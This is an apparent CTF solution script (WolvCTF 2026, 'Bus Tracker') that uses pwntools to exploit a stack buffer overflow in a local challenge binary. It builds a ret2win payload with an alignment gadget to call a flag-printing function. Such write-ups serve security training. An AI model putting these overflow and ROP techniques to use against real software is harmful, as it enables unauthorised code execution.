"""
title: Bus Tracker
ctf: WolvCTF 2026
category: pwn
difficulty: 1
arch: amd64
linking: static
mitigation_gaps: [no-pie, no-canary, partial-relro, not-stripped]
vulnerabilities: [stack-overflow]
tags: [ret2win, rop]
"""
from pwn import *
import re

# =====
# ANALYSIS
# =====
# Statically linked, no PIE. The vulnerable function has no canary even though
# the static libc routines do.
# checkStopName() reads into a buffer at rbp-0x40 with a read() of up to 0x100
# bytes, overflowing it, so saved RIP is controlled with ~23 words of ROP.
# dispatcherOverride() reads and prints the flag unconditionally (no argument
# needed), so it is the ret2win target. No PIE, addresses are fixed.
# Plan: overflow straight into dispatcherOverride, with a bare ret first to
# keep the stack 16-byte aligned for the printf it runs.

# =====
# CONSTANTS
# =====
BUFF_TO_RBP_OFF = 0x40               # buffer start to saved rbp
DISPATCHER_OVERRIDE_ADDR = 0x4017E5  # ret2win target (prints the flag)
RET_ADDR = 0x497a5c                  # bare ret, for stack alignment

# =====
# EXPLOIT
# =====

# Build the chain: align, then jump into dispatcherOverride.
payload = b"A" * (BUFF_TO_RBP_OFF + 0x8)    # overflow buffer + saved rbp
payload += p64(RET_ADDR)                    # keep 16-byte stack alignment
payload += p64(DISPATCHER_OVERRIDE_ADDR)    # jump to the target

# Spawn the target and send the payload.
p = process("./chal")
p.send(payload)

# --- Flag ---

# Extract the flag from the program output.
output = p.recvall(timeout=5)
match = re.search(rb"wctf\{[^}]*\}", output)
if match:
    print(f"Found flag: {match.group(0).decode()}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
